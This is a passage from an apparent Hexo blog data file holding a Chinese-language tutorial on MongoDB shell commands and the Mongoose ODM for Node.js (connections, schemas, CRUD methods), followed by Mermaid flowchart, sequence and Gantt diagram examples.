class=\"line\">&#125;, &#123;</span><br><span class=\"line\">  multi: <span class=\"literal\">true</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.runoob.com/mongodb/mongodb-remove.html\" target=\"_blank\" rel=\"noopener\"><strong>删除文档</strong></a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.&lt;collecetion&gt;.remove(</span><br><span class=\"line\">  删除条件,</span><br><span class=\"line\">  是否删除一个&lt;<span class=\"literal\">true</span>为删除一个，默认<span class=\"literal\">false</span>&gt;</span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"comment\"># 会删除符合条件的所有数据</span></span><br><span class=\"line\"><span class=\"comment\"># 如果传递一个空对象，会把所有数据删除</span></span><br><span class=\"line\"></span><br><span class=\"line\">db.&lt;collecetion&gt;.remove(&#123;&#125;) <span class=\"comment\"># 性能较差，删除数据，但是不清空集合</span></span><br><span class=\"line\"></span><br><span class=\"line\">db.&lt;collecetion&gt;.deleteOne(删除条件)</span><br><span class=\"line\">db.&lt;collecetion&gt;.deleteMany(删除条件)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">show collecetions</span><br><span class=\"line\">db.dropDatabase() <span class=\"comment\"># 删除 数据库</span></span><br><span class=\"line\">db.&lt;collecetion&gt;.drop() <span class=\"comment\"># 清空集合</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"条件操作符\"><a href=\"#条件操作符\" class=\"headerlink\" title=\"条件操作符\"></a>条件操作符</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$gt</span> &gt; <span class=\"variable\">$gte</span> &gt;=  <span class=\"variable\">$lt</span>  &lt; <span class=\"variable\">$lte</span> &lt;=  <span class=\"variable\">$ne</span> !=  <span class=\"variable\">$eq</span>  =</span><br></pre></td></tr></table></figure>\n<h3 id=\"type操作符\"><a href=\"#type操作符\" class=\"headerlink\" title=\"$type操作符\"></a>$type操作符</h3><p> 根据字符数据类型查询</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.col.insert([</span><br><span class=\"line\">\t&#123;title: <span class=\"string\">'PHP 教程'</span>&#125;,</span><br><span class=\"line\">\t&#123;title: <span class=\"string\">'Java 教程'</span>&#125;,</span><br><span class=\"line\">\t&#123;title: <span class=\"string\">'MongoDB 教程'</span>&#125;</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查询 title 为 string 的文档</span></span><br><span class=\"line\">db.col.find(&#123;<span class=\"string\">\"title\"</span> : &#123;<span class=\"variable\">$type</span> : 2&#125;&#125;)</span><br><span class=\"line\">或</span><br><span class=\"line\">db.col.find(&#123;<span class=\"string\">\"title\"</span> : &#123;<span class=\"variable\">$type</span> : <span class=\"string\">'string'</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Limit与Skip方法\"><a href=\"#Limit与Skip方法\" class=\"headerlink\" title=\"Limit与Skip方法\"></a>Limit与Skip方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.COLLECTION_NAME.find().<span class=\"built_in\">limit</span>(NUMBER) <span class=\"comment\"># 限制查询多少条</span></span><br><span class=\"line\">db.COLLECTION_NAME.find().skip(NUMBER) <span class=\"comment\"># 跳过多少条</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"sort-方法\"><a href=\"#sort-方法\" class=\"headerlink\" title=\"sort() 方法\"></a>sort() 方法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.col.find(&#123;&#125;).sort(&#123;<span class=\"string\">\"likes\"</span>:-1&#125;) <span class=\"comment\"># 数据按字段 likes 的降序排列 1为升序 -1为降序</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"createIndex-方法\"><a href=\"#createIndex-方法\" class=\"headerlink\" title=\"createIndex() 方法\"></a>createIndex() 方法</h3><p>索引存储在一个易于遍历读取的数据集合中，索引是对数据库表中一列或多列的值进行排序的一种结构。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">db.col.createIndex(&#123;<span class=\"string\">\"title\"</span>:1&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1、查看集合索引</span></span><br><span class=\"line\">db.col.getIndexes()</span><br><span class=\"line\"><span class=\"comment\"># 2、查看集合索引大小</span></span><br><span class=\"line\">db.col.totalIndexSize()</span><br><span class=\"line\"><span class=\"comment\"># 3、删除集合所有索引</span></span><br><span class=\"line\">db.col.dropIndexes()</span><br><span class=\"line\"><span class=\"comment\"># 4、删除集合指定索引</span></span><br><span class=\"line\">db.col.dropIndex(<span class=\"string\">\"索引名称\"</span>)</span><br></pre></td></tr></table></figure>\n"},{"title":"Mongoose","abbrlink":40119,"date":"2020-06-18T07:20:24.000Z","_content":"\nMongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。\n\nmongoose是当前使用mean（mongodb express angularjs nodejs）全栈开发必用的连接数据库软件包。\n\n参考资料：\n\n[在线数据库](https://mlab.com/)\n\n\n[mongoose guide](http://www.mongoosejs.net/docs/guide.html)\n\n## 后台与数据库交互\n\n+ 使用数据库的原生语言（例如 SQL）\n+ 使用对象数据模型（Object Data Model，简称 ODM）或对象关系模型（Object Relational Model，简称 ORM）。 ODM / ORM 能将网站中的数据表示为 JavaScript 对象，然后将它们映射到底层数据库。一些 ORM 只适用某些特定数据库，还有一些是普遍适用的。\n\n使用 SQL 或其它受到支持的查询语言才能达到最佳性能。\n\nODM 通常慢一些，因为在对象和数据库格式之间存在一层用于映射的翻译代码，使它不一定会选用最高性能的数据库查询（尤其是普遍使用级别的 ODM，它必须在各类数据库功能方面做出更大的折衷）。\n\n使用 ORM 的好处是：程序员可以继续用 JavaScript 对象的思维而不用转向数据库语义的思维。 在（同一个或不同网站）使用不同数据库时尤为明显。使用 ORM 还可以更方便地对数据进行验证和检查。\n\n\n## Mongoose\n\n+ Mongoose是在node.js异步环境下对mongodb进行便捷操作的对象模型工具\n\nMongoose 的优点：\n\n+ 可以为文档创建一个模式结构（Schema）\n+ 可以对模型中的对象/文档进行验证\n+ 数据可以通过类型转换为对象模型\n+ 可以使用中间件来应用业务逻辑挂钩\n+ 比 Node 原生的 MongoDB 驱动更容易\n  Mongoose 是最受欢迎的 ODM，选用 MongoDB 数据库时，它是一个合理的选择。\n\n新的对象：\n\n+ Schema（模式对象）\n  — Schema对象定义约束了数据库中的文档结构\n+ Model\n  — Model对象作为集合中的所有文件的表示，相当于MondoDB数据库中的集合collection\n+ Document\n  — Document 表示集合中的具体文档，相当于集合中的一个具体的文档\n\n### mongoose 连接数据库\n\n```js\n// 1.下载 npm init -y & npm i mongoose -S\n\n// 2.引入 mongoose\nconst mongoose = require('mongoose')\n\n// 4.监听mongoDB数据库的连接状态\nmongoose.connection.once('open', () => {\n  console.log('成功连接到 mongoDB 数据库')\n})\nmongoose.connection.once('close', () => {\n  console.log('断开 mongoDB 数据库')\n})\n\n// 3.连接数据库\n// mongoose.connect('mongodb://数据库ip地址:端口号(默认：27017)/数据库名')\nmongoose.connect(\n  'mongodb://127.0.0.1/test',\n  {\n    useNewUrlParser: true,\n    useUnifiedTopology: true\n  },\n  (err, db) => {\n    console.log('连接数据库成功')\n  }\n)\n\n// mongoose 断开连接\n// mongoose.disconnect()\n\n// 定义一个schema\nconst Schema = mongoose.Schema\n\n// model模型\nconst stuSchema = new Schema({\n  name: String,\n  age: Number,\n  gender: {\n    type: String,\n    default: 'female'\n  },\n  address: String\n})\n\n// 创建一个 model -> collection # mogoose.model(modelName, schema)\nconst StuModel = mongoose.model('stus', stuSchema)\n\n\n// 测试：创建一个文档插入到数据库中\n// StuModel.create({\n//   name: 'houfei',\n//   age: 25,\n//   gender: 'male',\n//   address: '河北'\n// }, err => {\n//   if(!err) console.log('插入成功')\n//   else console.log('插入失败')\n// })\n\n```\n\n### Model的API\n\n**document 是 model 的实例**\n\n####  插入\n\n```js\n// StuModel.create(object1, object2, ..., (err, object1, object2, ...) = > { })\n// StuModel.create(array, (err, array) = > { })\nStuModel.create(\n  [{\n    name: 'liming',\n    age: 23,\n    gender: 'male',\n    address: '安徽'\n  }], (err, array) => {\n  console.log(array)\n  if(!err) console.log('插入成功')\n  else console.log('插入失败')\n})\n```\n\n#### 查询数据\n\n```js\n/**\n * filter 查询条件\n * projection 投影\n * options 查询选项 skip limit\n * callback 回调函数\n  Model.find(filter, [projection], [options], [callback])\n  Model.findById()\n  Model.findByIdAndDelete()\n  Model.findByIdAndRemove()\n  Model.findByIdAndUpdate()\n  Model.findOne()\n  Model.findOneAndDelete()\n  Model.findOneAndRemove()\n  Model.findOneAndReplace()\n  Model.findOneAndUpdate()\n*/\n```\n\n```js\n// 在 StuModel 查询 name 为 jack，并且 age 大于 22的所有array文档，并且只显示 name age 属性，不显示 _id 属性， array并且要跳过 skip 第一条数据\nStuModel.find({ name: 'jack', age: { $gte: 22 } }, 'name age -_id', { skip: 1 }, (err, docs) => {\n  console.log(docs)\n  if(!err) console.log('查询成功')\n  else console.log('查询失败')\n})\n```\n\n```js\nStuModel.findOne({ age: { $gte: 19 } }, 'name age -_id', {}, (err, doc) => {\n  console.log(doc)\n  if(!err) console.log('查询成功')\n  else console.log('查询失败')\n})\n```\n\n\n```js\nStuModel.findById('5ee9f47cf67607ea5eda6894', 'name', { }, (err, doc) => {\n  console.log(doc instanceof StuModel)\n  if(!err) console.log('查询成功')\n  else console.log('查询失败')\n})\n```\n\n\n#### 更新数据\n\n```js\n/*\nModel.updateMany(filter, doc, [options], [callback])\nModel.updateOne(filter, doc, [options], [callback])\nModel.replaceOne(filter, doc, [options], [callback])\n*/\n\nStuModel.updateOne({name: \"houfei\"}, {\n  $set: {\n    age: 1\n  }\n}, {multi: false}, (err, status) => {\n  console.log(status)\n  if(!err) console.log('修改成功')\n  else console.log('修改失败')\n})\n```\n\n\n#### 删除数据\n\n```js\n/*\nModel.deleteMany(conditions, [options], [callback])\nModel.deleteOne(conditions, [options], [callback])\n*/\n\nStuModel.deleteOne({name: \"houfei\"}, (err, state) => {\n  console.log(state)\n  if(!err) console.log('删除成功')\n  else console.log('删除失败')\n})\n```\n\n### Document的API\n\n```js\n// 创建 Document 对象\nlet stu = new StuModel({\n  name: '李白',\n  age: 30,\n  gender: 'female',\n  address: '四川'\n})\n```\n\n#### [doc.save()](https://mongoosejs.com/docs/api/document.html#document_Document-save)\n\n```js\n// 保存方法 save\nstu.save((err, state) => {\n  console.log(state)\n  if(!err) console.log('添加成功')\n  else console.log('添加失败')\n})\n```\n\n#### [doc.update()](https://mongoosejs.com/docs/api/document.html#document_Document-update)\n\n```js\nStuModel.findOne({}, (error, doc) => {\n  /**\n   * Document.prototype.update(doc, options, callback)\n   * doc «Object»\n   * options «Object»\n   * callback «Function»\n   */\n  doc.update({$set: {\n    age: 1\n  }},(err, status) => {\n    console.log(status)\n    if(!err) console.log('修改成功')\n    else console.log('修改失败')\n  })\n})\n\n```\n\n#### [doc.get()|.set()|id](https://mongoosejs.com/docs/api/document.html#document_Document-get)\n\n```js\nStuModel.findOne({}, (error, doc) => {\n  console.log(doc.id)\n  doc.get('address', String)\n  doc.set('age', 99)\n})\n```\n\n#### [doc.toJSON()|toObject](https://mongoosejs.com/docs/api/document.html#document_Document-toJSON)\n\n```js\nStuModel.findOne({}, (error, doc) => {\n  let a = doc.toJSON()\n  let b = doc.toObject()\n  console.log(a, b)\n})\n```\n\n### Mongoose模块化\n\n\n\n[ 视频地址](https://www.bilibili.com/video/BV1Lb411V7rv?p=19)\n\n### 拓展甘特图\n\n[GitHub guide](https://mermaid-js.github.io/mermaid/#/README)\n\n#### [流程图](https://mermaid-js.github.io/mermaid/#/README?id=flowchart)\n\n```mermaid\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n\n#### [顺序图](https://mermaid-js.github.io/mermaid/#/README?id=sequence-diagram)\n\n```mermaid\nsequenceDiagram\n    participant Alice\n    participant Bob\n    Alice->>John: Hello John, how are you?\n    loop Healthcheck\n        John->>John: Fight against hypochondria\n    end\n    Note right of John: Rational thoughts <br/>prevail!\n    John-->>Alice: Great!\n    John->>Bob: How about you?\n    Bob-->>John: Jolly good!\n```\n\n#### [甘特图](https://mermaid-js.github.io/mermaid/#/README?id=gantt-diagram)\n\n```mermaid\ngantt\ndateFormat  YYYY-MM-DD\ntitle Adding GANTT diagram to mermaid\nexcludes weekdays 2014-01-10\n\nsection A section\nCompleted task            :done,    des1, 2014-01-06,2014-01-08\nActive task               :active,  des2, 2014-01-09, 3d\nFuture task               :         des3, after des2, 5d\nFuture task2               :         des4, after des3, 5d\n```\n\n#### 其他一\n\n```mermaid\ngraph LR\n    A(开始) -->B(起床)\n    B --天气不好--- C>干活]\n    C ==> D{休息时间到了}\n    D -.yes.-> E((休息))\n    D -.no.-> C\n    E --> F(吃饭)\n```\n\n#### 其他二\n\n```mermaid\nsequenceDiagram\n对象A->>对象B:中午吃什么？\n对象B->>对象A: 随便\nloop 思考\n    对象A->对象A: 努力搜索\nend\n对象A-->>对象B: 火锅？\n对象B->>对象A: 可以\nNote left of 对象A: 我是一个对象A\nNote right of 对象B: 我是一个对象B\nparticipant 对象C\nNote over 对象C: 我自己说了算\n```\n\n\n\n#### 其他三\n\n```mermaid\ngantt\n        dateFormat  YYYY-MM-DD\n        title 软件开发甘特图\n        section 设计\n        需求:done,des1, 2019-01-06,2019-01-08\n        原型:active,des2, 2019-01-09, 3d\n        UI设计:des3, after des2, 5d\n        未来任务:des4, after des3, 5d\n\n        section 开发\n        学习准备理解需求:crit, done, 2019-01-06,24h\n        设计框架:crit, done, after des2, 2d\n        开发:crit, active, 3d\n        未来任务:crit, 5d\n        休息时间:2d\n\n        section 测试\n        功能测试:active, a1, after des3, 3d\n        压力测试:after a1, 20h\n        测试报告: 48h\n```\n","source":"_posts/Mongoose.md","raw":"---\ntitle: Mongoose\nabbrlink: 40119\ndate: 2020-06-18 15:20:24\ncategories:\n  - 数据库\ntags:\n  - MongoDB\n---\n\nMongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。\n\nmongoose是当前使用mean（mongodb express angularjs nodejs）全栈开发必用的连接数据库软件包。\n\n参考资料：\n\n[在线数据库](https://mlab.com/)\n\n\n[mongoose guide](http://www.mongoosejs.net/docs/guide.html)\n\n## 后台与数据库交互\n\n+ 使用数据库的原生语言（例如 SQL）\n+ 使用对象数据模型（Object Data Model，简称 ODM）或对象关系模型（Object Relational Model，简称 ORM）。 ODM / ORM 能将网站中的数据表示为 JavaScript 对象，然后将它们映射到底层数据库。一些 ORM 只适用某些特定数据库，还有一些是普遍适用的。\n\n使用 SQL 或其它受到支持的查询语言才能达到最佳性能。\n\nODM 通常慢一些，因为在对象和数据库格式之间存在一层用于映射的翻译代码，使它不一定会选用最高性能的数据库查询（尤其是普遍使用级别的 ODM，它必须在各类数据库功能方面做出更大的折衷）。\n\n使用 ORM 的好处是：程序员可以继续用 JavaScript 对象的思维而不用转向数据库语义的思维。 在（同一个或不同网站）使用不同数据库时尤为明显。使用 ORM 还可以更方便地对数据进行验证和检查。\n\n\n## Mongoose\n\n+ Mongoose是在node.js异步环境下对mongodb进行便捷操作的对象模型工具\n\nMongoose 的优点：\n\n+ 可以为文档创建一个模式结构（Schema）\n+ 可以对模型中的对象/文档进行验证\n+ 数据可以通过类型转换为对象模型\n+ 可以使用中间件来应用业务逻辑挂钩\n+ 比 Node 原生的 MongoDB 驱动更容易\n  Mongoose 是最受欢迎的 ODM，选用 MongoDB 数据库时，它是一个合理的选择。\n\n新的对象：\n\n+ Schema（模式对象）\n  — Schema对象定义约束了数据库中的文档结构\n+ Model\n  — Model对象作为集合中的所有文件的表示，相当于MondoDB数据库中的集合collection\n+ Document\n  — Document 表示集合中的具体文档，相当于集合中的一个具体的文档\n\n### mongoose 连接数据库\n\n```js\n// 1.下载 npm init -y & npm i mongoose -S\n\n// 2.引入 mongoose\nconst mongoose = require('mongoose')\n\n// 4.监听mongoDB数据库的连接状态\nmongoose.connection.once('open', () => {\n  console.log('成功连接到 mongoDB 数据库')\n})\nmongoose.connection.once('close', () => {\n  console.log('断开 mongoDB 数据库')\n})\n\n// 3.连接数据库\n// mongoose.connect('mongodb://数据库ip地址:端口号(默认：27017)/数据库名')\nmongoose.connect(\n  'mongodb://127.0.0.1/test',\n  {\n    useNewUrlParser: true,\n    useUnifiedTopology: true\n  },\n  (err, db) => {\n    console.log('连接数据库成功')\n  }\n)\n\n// mongoose 断开连接\n// mongoose.disconnect()\n\n// 定义一个schema\nconst Schema = mongoose.Schema\n\n// model模型\nconst stuSchema = new Schema({\n  name: String,\n  age: Number,\n  gender: {\n    type: String,\n    default: 'female'\n  },\n  address: String\n})\n\n// 创建一个 model -> collection # mogoose.model(modelName, schema)\nconst StuModel = mongoose.model('stus', stuSchema)\n\n\n// 测试：创建一个文档插入到数据库中\n// StuModel.create({\n//   name: 'houfei',\n//   age: 25,\n//   gender: 'male',\n//   address: '河北'\n// }, err => {\n//   if(!err) console.log('插入成功')\n//   else console.log('插入失败')\n// })\n\n```\n\n### Model的API\n\n**document 是 model 的实例**\n\n####  插入\n\n```js\n// StuModel.create(object1, object2, ..., (err, object1, object2, ...) = > { })\n// StuModel.create(array, (err, array) = > { })\nStuModel.create(\n  [{\n    name: 'liming',\n    age: 23,\n    gender: 'male',\n    address: '安徽'\n  }], (err, array) => {\n  console.log(array)\n  if(!err) console.log('插入成功')\n  else console.log('插入失败')\n})\n```\n\n#### 查询数据\n\n```js\n/**\n * filter 查询条件\n * projection 投影\n * options 查询选项 skip limit\n * callback 回调函数\n  Model.find(filter, [projection], [options], [callback])\n  Model.findById()\n  Model.findByIdAndDelete()\n  Model.findByIdAndRemove()\n  Model.findByIdAndUpdate()\n  Model.findOne()\n  Model.findOneAndDelete()\n  Model.findOneAndRemove()\n  Model.findOneAndReplace()\n  Model.findOneAndUpdate()\n*/\n```\n\n```js\n// 在 StuModel 查询 name 为 jack，并且 age 大于 22的所有array文档，并且只显示 name age 属性，不显示 _id 属性， array并且要跳过 skip 第一条数据\nStuModel.find({ name: 'jack', age: { $gte: 22 } }, 'name age -_id', { skip: 1 }, (err, docs) => {\n  console.log(docs)\n  if(!err) console.log('查询成功')\n  else console.log('查询失败')\n})\n```\n\n```js\nStuModel.findOne({ age: { $gte: 19 } }, 'name age -_id', {}, (err, doc) => {\n  console.log(doc)\n  if(!err) console.log('查询成功')\n  else console.log('查询失败')\n})\n```\n\n\n```js\nStuModel.findById('5ee9f47cf67607ea5eda6894', 'name', { }, (err, doc) => {\n  console.log(doc instanceof StuModel)\n  if(!err) console.log('查询成功')\n  else console.log('查询失败')\n})\n```\n\n\n#### 更新数据\n\n```js\n/*\nModel.updateMany(filter, doc, [options], [callback])\nModel.updateOne(filter, doc, [options], [callback])\nModel.replaceOne(filter, doc, [options], [callback])\n*/\n\nStuModel.updateOne({name: \"houfei\"}, {\n  $set: {\n    age: 1\n  }\n}, {multi: false}, (err, status) => {\n  console.log(status)\n  if(!err) console.log('修改成功')\n  else console.log('修改失败')\n})\n```\n\n\n#### 删除数据\n\n```js\n/*\nModel.deleteMany(conditions, [options], [callback])\nModel.deleteOne(conditions, [options], [callback])\n*/\n\nStuModel.deleteOne({name: \"houfei\"}, (err, state) => {\n  console.log(state)\n  if(!err) console.log('删除成功')\n  else console.log('删除失败')\n})\n```\n\n### Document的API\n\n```js\n// 创建 Document 对象\nlet stu = new StuModel({\n  name: '李白',\n  age: 30,\n  gender: 'female',\n  address: '四川'\n})\n```\n\n#### [doc.save()](https://mongoosejs.com/docs/api/document.html#document_Document-save)\n\n```js\n// 保存方法 save\nstu.save((err, state) => {\n  console.log(state)\n  if(!err) console.log('添加成功')\n  else console.log('添加失败')\n})\n```\n\n#### [doc.update()](https://mongoosejs.com/docs/api/document.html#document_Document-update)\n\n```js\nStuModel.findOne({}, (error, doc) => {\n  /**\n   * Document.prototype.update(doc, options, callback)\n   * doc «Object»\n   * options «Object»\n   * callback «Function»\n   */\n  doc.update({$set: {\n    age: 1\n  }},(err, status) => {\n    console.log(status)\n    if(!err) console.log('修改成功')\n    else console.log('修改失败')\n  })\n})\n\n```\n\n#### [doc.get()|.set()|id](https://mongoosejs.com/docs/api/document.html#document_Document-get)\n\n```js\nStuModel.findOne({}, (error, doc) => {\n  console.log(doc.id)\n  doc.get('address', String)\n  doc.set('age', 99)\n})\n```\n\n#### [doc.toJSON()|toObject](https://mongoosejs.com/docs/api/document.html#document_Document-toJSON)\n\n```js\nStuModel.findOne({}, (error, doc) => {\n  let a = doc.toJSON()\n  let b = doc.toObject()\n  console.log(a, b)\n})\n```\n\n### Mongoose模块化\n\n\n\n[ 视频地址](https://www.bilibili.com/video/BV1Lb411V7rv?p=19)\n\n### 拓展甘特图\n\n[GitHub guide](https://mermaid-js.github.io/mermaid/#/README)\n\n#### [流程图](https://mermaid-js.github.io/mermaid/#/README?id=flowchart)\n\n```mermaid\ngraph TD;\n    A-->B;\n    A-->C;\n    B-->D;\n    C-->D;\n```\n\n#### [顺序图](https://mermaid-js.github.io/mermaid/#/README?id=sequence-diagram)\n\n```mermaid\nsequenceDiagram\n    participant Alice\n    participant Bob\n    Alice->>John: Hello John, how are you?\n    loop Healthcheck\n        John->>John: Fight against hypochondria\n    end\n    Note right of John: Rational thoughts <br/>prevail!\n    John-->>Alice: Great!\n    John->>Bob: How about you?\n    Bob-->>John: Jolly good!\n```\n\n#### [甘特图](https://mermaid-js.github.io/mermaid/#/README?id=gantt-diagram)\n\n```mermaid\ngantt\ndateFormat  YYYY-MM-DD\ntitle Adding GANTT diagram to mermaid\nexcludes weekdays 2014-01-10\n\nsection A section\nCompleted task            :done,    des1, 2014-01-06,2014-01-08\nActive task               :active,  des2, 2014-01-09, 3d\nFuture task               :         des3, after des2, 5d\nFuture task2               :         des4, after des3, 5d\n```\n\n#### 其他一\n\n```mermaid\ngraph LR\n    A(开始) -->B(起床)\n    B --天气不好--- C>干活]\n    C ==> D{休息时间到了}\n    D -.yes.-> E((休息))\n    D -.no.-> C\n    E --> F(吃饭)\n```\n\n#### 其他二\n\n```mermaid\nsequenceDiagram\n对象A->>对象B:中午吃什么？\n对象B->>对象A: 随便\nloop 思考\n    对象A->对象A: 努力搜索\nend\n对象A-->>对象B: 火锅？\n对象B->>对象A: 可以\nNote left of 对象A: 我是一个对象A\nNote right of 对象B: 我是一个对象B\nparticipant 对象C\nNote over 对象C: 我自己说了算\n```\n\n\n\n#### 其他三\n\n```mermaid\ngantt\n        dateFormat  YYYY-MM-DD\n        title 软件开发甘特图\n        section 设计\n        需求:done,des1, 2019-01-06,2019-01-08\n        原型:active,des2, 2019-01-09, 3d\n        UI设计:des3, after des2, 5d\n        未来任务:des4, after des3, 5d\n\n        section 开发\n        学习准备理解需求:crit, done, 2019-01-06,24h\n        设计框架:crit, done, after des2, 2d\n        开发:crit, active, 3d\n        未来任务:crit, 5d\n        休息时间:2d\n\n        section 测试\n        功能测试:active, a1, after des3, 3d\n        压力测试:after a1, 20h\n        测试报告: 48h\n```\n","slug":"Mongoose","published":1,"updated":"2020-07-14T09:49:06.198Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr7htu00011twtjr7k29g7","content":"<p>Mongoose 是基于nodejs，使用javascript编程，连接mongodb数据库的软件包，使mongodb的文档数据模型变的优雅起来，方便对mongodb文档型数据库的连接和增删改查等常规数据操作。</p>\n<p>mongoose是当前使用mean（mongodb express angularjs nodejs）全栈开发必用的连接数据库软件包。</p>\n<p>参考资料：</p>\n<p><a href=\"https://mlab.com/\" target=\"_blank\" rel=\"noopener\">在线数据库</a></p>\n<p><a href=\"http://www.mongoosejs.net/docs/guide.html\" target=\"_blank\" rel=\"noopener\">mongoose guide</a></p>\n<h2 id=\"后台与数据库交互\"><a href=\"#后台与数据库交互\" class=\"headerlink\" title=\"后台与数据库交互\"></a>后台与数据库交互</h2><ul>\n<li>使用数据库的原生语言（例如 SQL）</li>\n<li>使用对象数据模型（Object Data Model，简称 ODM）或对象关系模型（Object Relational Model，简称 ORM）。 ODM / ORM 能将网站中的数据表示为 JavaScript 对象，然后将它们映射到底层数据库。一些 ORM 只适用某些特定数据库，还有一些是普遍适用的。</li>\n</ul>\n<p>使用 SQL 或其它受到支持的查询语言才能达到最佳性能。</p>\n<p>ODM 通常慢一些，因为在对象和数据库格式之间存在一层用于映射的翻译代码，使它不一定会选用最高性能的数据库查询（尤其是普遍使用级别的 ODM，它必须在各类数据库功能方面做出更大的折衷）。</p>\n<p>使用 ORM 的好处是：程序员可以继续用 JavaScript 对象的思维而不用转向数据库语义的思维。 在（同一个或不同网站）使用不同数据库时尤为明显。使用 ORM 还可以更方便地对数据进行验证和检查。</p>\n<h2 id=\"Mongoose\"><a href=\"#Mongoose\" class=\"headerlink\" title=\"Mongoose\"></a>Mongoose</h2><ul>\n<li>Mongoose是在node.js异步环境下对mongodb进行便捷操作的对象模型工具</li>\n</ul>\n<p>Mongoose 的优点：</p>\n<ul>\n<li>可以为文档创建一个模式结构（Schema）</li>\n<li>可以对模型中的对象/文档进行验证</li>\n<li>数据可以通过类型转换为对象模型</li>\n<li>可以使用中间件来应用业务逻辑挂钩</li>\n<li>比 Node 原生的 MongoDB 驱动更容易<br>Mongoose 是最受欢迎的 ODM，选用 MongoDB 数据库时，它是一个合理的选择。</li>\n</ul>\n<p>新的对象：</p>\n<ul>\n<li>Schema（模式对象）<br>— Schema对象定义约束了数据库中的文档结构</li>\n<li>Model<br>— Model对象作为集合中的所有文件的表示，相当于MondoDB数据库中的集合collection</li>\n<li>Document<br>— Document 表示集合中的具体文档，相当于集合中的一个具体的文档</li>\n</ul>\n<h3 id=\"mongoose-连接数据库\"><a href=\"#mongoose-连接数据库\" class=\"headerlink\" title=\"mongoose 连接数据库\"></a>mongoose 连接数据库</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1.下载 npm init -y &amp; npm i mongoose -S</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 2.引入 mongoose</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> mongoose = <span class=\"built_in\">require</span>(<span class=\"string\">'mongoose'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 4.监听mongoDB数据库的连接状态</span></span><br><span class=\"line\">mongoose.connection.once(<span 